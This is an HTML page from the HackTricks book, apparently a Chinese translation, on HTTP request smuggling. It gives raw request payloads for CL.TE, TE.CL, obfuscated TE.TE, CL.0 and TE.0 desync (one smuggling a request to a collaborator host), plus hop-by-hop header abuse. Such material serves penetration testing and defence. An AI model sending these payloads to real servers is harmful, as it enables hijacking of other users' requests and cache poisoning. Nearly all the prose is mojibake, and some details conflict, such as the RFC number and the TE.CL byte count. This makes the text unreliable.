<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>HTTP Request Smuggling / HTTP Desync Attack</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="http-request-smuggling--http-desync-attack"><a class="header" href="#http-request-smuggling--http-desync-attack">HTTP Request Smuggling / HTTP Desync Attack</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦å®¡è§†æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>å‘ç°å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬ 20 å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼ŒæŸ¥æ‰¾å…è®¸æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–åˆ©ç”¨æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="ä»€ä¹ˆæ˜¯"><a class="header" href="#ä»€ä¹ˆæ˜¯">ä»€ä¹ˆæ˜¯</a></h2>
<p>å½“ <strong>å‰ç«¯ä»£ç†</strong> å’Œ <strong>åç«¯</strong> æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ <strong>ä¸åŒæ­¥</strong> æ—¶ï¼Œå…è®¸ <strong>æ”»å‡»è€…</strong> å‘é€ä¸€ä¸ª HTTP <strong>è¯·æ±‚</strong>ï¼Œè¯¥è¯·æ±‚å°†è¢« <strong>å‰ç«¯</strong> ä»£ç†ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰è§£é‡Šä¸º <strong>å•ä¸ªè¯·æ±‚</strong>ï¼Œè€Œè¢« <strong>åç«¯</strong> æœåŠ¡å™¨è§£é‡Šä¸º <strong>ä¸¤ä¸ªè¯·æ±‚</strong>ã€‚<br />
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿ <strong>ä¿®æ”¹åˆ°è¾¾åç«¯æœåŠ¡å™¨çš„ä¸‹ä¸€ä¸ªè¯·æ±‚</strong>ã€‚</p>
<h3 id="ç†è®º"><a class="header" href="#ç†è®º">ç†è®º</a></h3>
<p><a href="https://tools.ietf.org/html/rfc2616"><strong>RFC è§„èŒƒ (2161)</strong></a></p>
<blockquote>
<p>å¦‚æœæ”¶åˆ°çš„æ¶ˆæ¯åŒæ—¶åŒ…å« Transfer-Encoding å¤´å­—æ®µå’Œ Content-Length å¤´å­—æ®µï¼Œåˆ™åè€…å¿…é¡»è¢«å¿½ç•¥ã€‚</p>
</blockquote>
<p><strong>Content-Length</strong></p>
<blockquote>
<p>Content-Length å®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶æ–¹çš„å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p>
</blockquote>
<p><strong>Transfer-Encoding: chunked</strong></p>
<blockquote>
<p>Transfer-Encoding å¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè´Ÿè½½ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚<br />
Chunked æ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€ã€‚</p>
</blockquote>
<h3 id="ç°å®"><a class="header" href="#ç°å®">ç°å®</a></h3>
<p><strong>å‰ç«¯</strong>ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰<strong>å¤„ç†</strong> <em><strong>content-length</strong></em> æˆ– <em><strong>transfer-encoding</strong></em> å¤´ï¼Œè€Œ <strong>åç«¯</strong> æœåŠ¡å™¨ <strong>å¤„ç†å¦ä¸€ä¸ª</strong>ï¼Œå¯¼è‡´ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„ <strong>ä¸åŒæ­¥</strong>ã€‚<br />
è¿™å¯èƒ½éå¸¸å…³é”®ï¼Œå› ä¸º <strong>æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚</strong>ï¼Œè¯¥è¯·æ±‚å°†è¢« <strong>åç«¯</strong> æœåŠ¡å™¨ <strong>è§£é‡Šä¸ºä¸¤ä¸ªä¸åŒçš„è¯·æ±‚</strong>ã€‚è¿™ç§æŠ€æœ¯çš„ <strong>å±é™©</strong> åœ¨äº <strong>åç«¯</strong> æœåŠ¡å™¨ <strong>å°†è§£é‡Š</strong> <strong>æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚</strong>ï¼Œå°±å¥½åƒå®ƒ <strong>æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯</strong>ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„ <strong>çœŸå®è¯·æ±‚</strong> å°†æ˜¯ <strong>æ³¨å…¥è¯·æ±‚</strong> çš„ <strong>ä¸€éƒ¨åˆ†</strong>ã€‚</p>
<h3 id="ç‰¹ç‚¹"><a class="header" href="#ç‰¹ç‚¹">ç‰¹ç‚¹</a></h3>
<p>è¯·è®°ä½ï¼Œåœ¨ HTTP ä¸­ <strong>æ¢è¡Œç¬¦ç”± 2 ä¸ªå­—èŠ‚ç»„æˆï¼š</strong></p>
<ul>
<li><strong>Content-Length</strong>ï¼šæ­¤å¤´ä½¿ç”¨ <strong>åè¿›åˆ¶æ•°å­—</strong> æŒ‡ç¤ºè¯·æ±‚ <strong>ä¸»ä½“</strong> çš„ <strong>å­—èŠ‚æ•°</strong>ã€‚ä¸»ä½“é¢„è®¡åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ<strong>è¯·æ±‚æœ«å°¾ä¸éœ€è¦æ¢è¡Œ</strong>ã€‚</li>
<li><strong>Transfer-Encoding:</strong> æ­¤å¤´åœ¨ <strong>ä¸»ä½“</strong> ä¸­ä½¿ç”¨ <strong>åå…­è¿›åˆ¶æ•°å­—</strong> æŒ‡ç¤º <strong>ä¸‹ä¸€ä¸ªå—</strong> çš„ <strong>å­—èŠ‚æ•°</strong>ã€‚<strong>å—</strong> å¿…é¡»ä»¥ <strong>æ¢è¡Œ</strong> ç»“æŸï¼Œä½†æ­¤æ¢è¡Œ <strong>ä¸è®¡å…¥</strong> é•¿åº¦æŒ‡ç¤ºç¬¦ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥ <strong>å¤§å°ä¸º 0 çš„å—åè·Ÿ 2 ä¸ªæ¢è¡Œ</strong> ç»“æŸï¼š <code>0</code></li>
<li><strong>Connection</strong>ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚ Smuggling çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨ <strong><code>Connection: keep-alive</code></strong>ã€‚</li>
</ul>
<h2 id="åŸºæœ¬ç¤ºä¾‹"><a class="header" href="#åŸºæœ¬ç¤ºä¾‹">åŸºæœ¬ç¤ºä¾‹</a></h2>
<p>{% hint style="success" %}
åœ¨å°è¯•ä½¿ç”¨ Burp Suite åˆ©ç”¨æ­¤æ¼æ´æ—¶ï¼Œè¯· <strong>ç¦ç”¨ <code>Update Content-Length</code> å’Œ <code>Normalize HTTP/1 line endings</code></strong>ï¼Œå› ä¸ºæŸäº›å·¥å…·æ»¥ç”¨æ¢è¡Œç¬¦ã€å›è½¦å’Œæ ¼å¼é”™è¯¯çš„å†…å®¹é•¿åº¦ã€‚
{% endhint %}</p>
<p>HTTP è¯·æ±‚èµ°ç§æ”»å‡»æ˜¯é€šè¿‡å‘é€æ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚æ¥æ„é€ çš„ï¼Œè¿™äº›è¯·æ±‚åˆ©ç”¨äº†å‰ç«¯å’Œåç«¯æœåŠ¡å™¨åœ¨è§£é‡Š <code>Content-Length</code> (CL) å’Œ <code>Transfer-Encoding</code> (TE) å¤´æ—¶çš„å·®å¼‚ã€‚è¿™äº›æ”»å‡»å¯ä»¥ä»¥ä¸åŒå½¢å¼è¡¨ç°ï¼Œä¸»è¦ä¸º <strong>CL.TE</strong>ã€<strong>TE.CL</strong> å’Œ <strong>TE.TE</strong>ã€‚æ¯ç§ç±»å‹ä»£è¡¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¦‚ä½•ä¼˜å…ˆå¤„ç†è¿™äº›å¤´çš„ç‹¬ç‰¹ç»„åˆã€‚æ¼æ´æºäºæœåŠ¡å™¨ä»¥ä¸åŒæ–¹å¼å¤„ç†ç›¸åŒè¯·æ±‚ï¼Œå¯¼è‡´æ„å¤–å’Œæ½œåœ¨çš„æ¶æ„ç»“æœã€‚</p>
<h3 id="æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹"><a class="header" href="#æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹">æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹</a></h3>
<p><img src="../../.gitbook/assets/EKi5edAUUAAIPIK.jpg" alt="https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&amp;ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104" /></p>
<p>{% hint style="info" %}
åœ¨ä¹‹å‰çš„è¡¨æ ¼ä¸­ï¼Œæ‚¨åº”è¯¥æ·»åŠ  TE.0 æŠ€æœ¯ï¼Œç±»ä¼¼äº CL.0 æŠ€æœ¯ï¼Œä½†ä½¿ç”¨ Transfer Encodingã€‚
{% endhint %}</p>
<h4 id="clte-æ¼æ´å‰ç«¯ä½¿ç”¨-content-lengthåç«¯ä½¿ç”¨-transfer-encoding"><a class="header" href="#clte-æ¼æ´å‰ç«¯ä½¿ç”¨-content-lengthåç«¯ä½¿ç”¨-transfer-encoding">CL.TE æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Content-Lengthï¼Œåç«¯ä½¿ç”¨ Transfer-Encodingï¼‰</a></h4>
<ul>
<li><strong>å‰ç«¯ (CL)ï¼š</strong> æ ¹æ® <code>Content-Length</code> å¤´å¤„ç†è¯·æ±‚ã€‚</li>
<li><strong>åç«¯ (TE)ï¼š</strong> æ ¹æ® <code>Transfer-Encoding</code> å¤´å¤„ç†è¯·æ±‚ã€‚</li>
<li><strong>æ”»å‡»åœºæ™¯ï¼š</strong></li>
<li>æ”»å‡»è€…å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­ <code>Content-Length</code> å¤´çš„å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸åŒ¹é…ã€‚</li>
<li>å‰ç«¯æœåŠ¡å™¨æ ¹æ® <code>Content-Length</code> å€¼å°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚</li>
<li>åç«¯æœåŠ¡å™¨ç”±äº <code>Transfer-Encoding: chunked</code> å¤´å°†è¯·æ±‚å¤„ç†ä¸ºåˆ†å—ï¼Œè§£é‡Šå‰©ä½™æ•°æ®ä¸ºä¸€ä¸ªå•ç‹¬çš„åç»­è¯·æ±‚ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
</code></pre>
<h4 id="tecl-æ¼æ´å‰ç«¯ä½¿ç”¨-transfer-encodingåç«¯ä½¿ç”¨-content-length"><a class="header" href="#tecl-æ¼æ´å‰ç«¯ä½¿ç”¨-transfer-encodingåç«¯ä½¿ç”¨-content-length">TE.CL æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯ä½¿ç”¨ Content-Lengthï¼‰</a></h4>
<ul>
<li><strong>å‰ç«¯ (TE)ï¼š</strong> æ ¹æ® <code>Transfer-Encoding</code> å¤´å¤„ç†è¯·æ±‚ã€‚</li>
<li><strong>åç«¯ (CL)ï¼š</strong> æ ¹æ® <code>Content-Length</code> å¤´å¤„ç†è¯·æ±‚ã€‚</li>
<li><strong>æ”»å‡»åœºæ™¯ï¼š</strong></li>
<li>æ”»å‡»è€…å‘é€ä¸€ä¸ªåˆ†å—è¯·æ±‚ï¼Œå…¶ä¸­å—å¤§å°ï¼ˆ<code>7b</code>ï¼‰å’Œå®é™…å†…å®¹é•¿åº¦ï¼ˆ<code>Content-Length: 4</code>ï¼‰ä¸ä¸€è‡´ã€‚</li>
<li>å‰ç«¯æœåŠ¡å™¨å°Šé‡ <code>Transfer-Encoding</code>ï¼Œå°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚</li>
<li>åç«¯æœåŠ¡å™¨å°Šé‡ <code>Content-Length</code>ï¼Œä»…å¤„ç†è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼ˆ<code>7b</code> å­—èŠ‚ï¼‰ï¼Œå°†å…¶ä½™éƒ¨åˆ†ç•™ä½œæ„å¤–çš„åç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

</code></pre>
<h4 id="tete-æ¼æ´ä¸¤è€…éƒ½ä½¿ç”¨-transfer-encodingå¸¦æ··æ·†"><a class="header" href="#tete-æ¼æ´ä¸¤è€…éƒ½ä½¿ç”¨-transfer-encodingå¸¦æ··æ·†">TE.TE æ¼æ´ï¼ˆä¸¤è€…éƒ½ä½¿ç”¨ Transfer-Encodingï¼Œå¸¦æ··æ·†ï¼‰</a></h4>
<ul>
<li><strong>æœåŠ¡å™¨ï¼š</strong> ä¸¤è€…éƒ½æ”¯æŒ <code>Transfer-Encoding</code>ï¼Œä½†å¯ä»¥é€šè¿‡æ··æ·†è¢«æ¬ºéª—ä»¥å¿½ç•¥å®ƒã€‚</li>
<li><strong>æ”»å‡»åœºæ™¯ï¼š</strong></li>
<li>æ”»å‡»è€…å‘é€ä¸€ä¸ªå¸¦æœ‰æ··æ·† <code>Transfer-Encoding</code> å¤´çš„è¯·æ±‚ã€‚</li>
<li>æ ¹æ®å“ªä¸ªæœåŠ¡å™¨ï¼ˆå‰ç«¯æˆ–åç«¯ï¼‰æœªèƒ½è¯†åˆ«æ··æ·†ï¼Œå¯èƒ½ä¼šåˆ©ç”¨ CL.TE æˆ– TE.CL æ¼æ´ã€‚</li>
<li>è¯·æ±‚ä¸­æœªå¤„ç†çš„éƒ¨åˆ†ï¼Œä½œä¸ºå…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨æ‰€è§ï¼Œæˆä¸ºåç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´èµ°ç§ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
</code></pre>
<h4 id="clcl-åœºæ™¯å‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨-content-length"><a class="header" href="#clcl-åœºæ™¯å‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨-content-length"><strong>CL.CL åœºæ™¯ï¼ˆå‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨ Content-Lengthï¼‰</strong></a></h4>
<ul>
<li>ä¸¤ä¸ªæœåŠ¡å™¨ä»…æ ¹æ® <code>Content-Length</code> å¤´å¤„ç†è¯·æ±‚ã€‚</li>
<li>æ­¤åœºæ™¯é€šå¸¸ä¸ä¼šå¯¼è‡´èµ°ç§ï¼Œå› ä¸ºä¸¤ä¸ªæœåŠ¡å™¨åœ¨è§£é‡Šè¯·æ±‚é•¿åº¦æ—¶æ˜¯ä¸€è‡´çš„ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

æ­£å¸¸è¯·æ±‚
</code></pre>
<h4 id="cl0-åœºæ™¯"><a class="header" href="#cl0-åœºæ™¯"><strong>CL.0 åœºæ™¯</strong></a></h4>
<ul>
<li>æŒ‡çš„æ˜¯ <code>Content-Length</code> å¤´å­˜åœ¨ä¸”å€¼ä¸ä¸ºé›¶çš„åœºæ™¯ï¼Œè¡¨æ˜è¯·æ±‚ä¸»ä½“æœ‰å†…å®¹ã€‚åç«¯å¿½ç•¥ <code>Content-Length</code> å¤´ï¼ˆè¢«è§†ä¸º 0ï¼‰ï¼Œä½†å‰ç«¯è§£æå®ƒã€‚</li>
<li>è¿™åœ¨ç†è§£å’Œæ„é€ èµ°ç§æ”»å‡»æ—¶è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå½±å“æœåŠ¡å™¨ç¡®å®šè¯·æ±‚ç»“æŸçš„æ–¹å¼ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

éç©ºä¸»ä½“
</code></pre>
<h4 id="te0-åœºæ™¯"><a class="header" href="#te0-åœºæ™¯">TE.0 åœºæ™¯</a></h4>
<ul>
<li>ç±»ä¼¼äºå‰ä¸€ä¸ªåœºæ™¯ï¼Œä½†ä½¿ç”¨ TE</li>
<li>æŠ€æœ¯ <a href="https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/">åœ¨è¿™é‡ŒæŠ¥å‘Š</a></li>
<li><strong>ç¤ºä¾‹</strong>:</li>
</ul>
<pre><code>OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET &lt;http://our-collaborator-server/&gt; HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
</code></pre>
<h4 id="ç ´åç½‘ç»œæœåŠ¡å™¨"><a class="header" href="#ç ´åç½‘ç»œæœåŠ¡å™¨">ç ´åç½‘ç»œæœåŠ¡å™¨</a></h4>
<p>æ­¤æŠ€æœ¯åœ¨å¯ä»¥<strong>åœ¨è¯»å–åˆå§‹HTTPæ•°æ®æ—¶ç ´åç½‘ç»œæœåŠ¡å™¨</strong>ä½†<strong>ä¸å…³é—­è¿æ¥</strong>çš„åœºæ™¯ä¸­ä¹Ÿå¾ˆæœ‰ç”¨ã€‚è¿™æ ·ï¼ŒHTTPè¯·æ±‚çš„<strong>ä¸»ä½“</strong>å°†è¢«è§†ä¸º<strong>ä¸‹ä¸€ä¸ªHTTPè¯·æ±‚</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚<a href="https://mizu.re/post/twisty-python"><strong>è¿™ç¯‡æ–‡ç« </strong></a>ä¸­æ‰€è§£é‡Šçš„ï¼Œåœ¨Werkzeugä¸­å¯ä»¥å‘é€ä¸€äº›<strong>Unicode</strong>å­—ç¬¦ï¼Œè¿™å°†ä½¿æœåŠ¡å™¨<strong>å´©æºƒ</strong>ã€‚ç„¶è€Œï¼Œå¦‚æœHTTPè¿æ¥æ˜¯ä½¿ç”¨**<code>Connection: keep-alive</code><strong>å¤´åˆ›å»ºçš„ï¼Œè¯·æ±‚çš„ä¸»ä½“å°†ä¸ä¼šè¢«è¯»å–ï¼Œè¿æ¥ä»å°†ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤è¯·æ±‚çš„</strong>ä¸»ä½“<strong>å°†è¢«è§†ä¸º</strong>ä¸‹ä¸€ä¸ªHTTPè¯·æ±‚**ã€‚</p>
<h4 id="é€šè¿‡é€è·³å¤´å¼ºåˆ¶"><a class="header" href="#é€šè¿‡é€è·³å¤´å¼ºåˆ¶">é€šè¿‡é€è·³å¤´å¼ºåˆ¶</a></h4>
<p>æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç†<strong>åˆ é™¤Content-Lengthæˆ–Transfer-Encodingå¤´ï¼Œä»¥ä¾¿å¯ä»¥æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§</strong>ã€‚</p>
<pre><code>Connection: Content-Length
</code></pre>
<p>å¯¹äº<strong>æœ‰å…³é€è·³å¤´éƒ¨çš„æ›´å¤šä¿¡æ¯</strong>ï¼Œè¯·è®¿é—®ï¼š</p>
<p>{% content-ref url="../abusing-hop-by-hop-headers.md" %}
<a href="../abusing-hop-by-hop-headers.html">abusing-hop-by-hop-headers.md</a>
{% endcontent-ref %}</p>
<h2 id="æŸ¥æ‰¾-http-è¯·æ±‚èµ°ç§"><a class="header" href="#æŸ¥æ‰¾-http-è¯·æ±‚èµ°ç§">æŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§</a></h2>
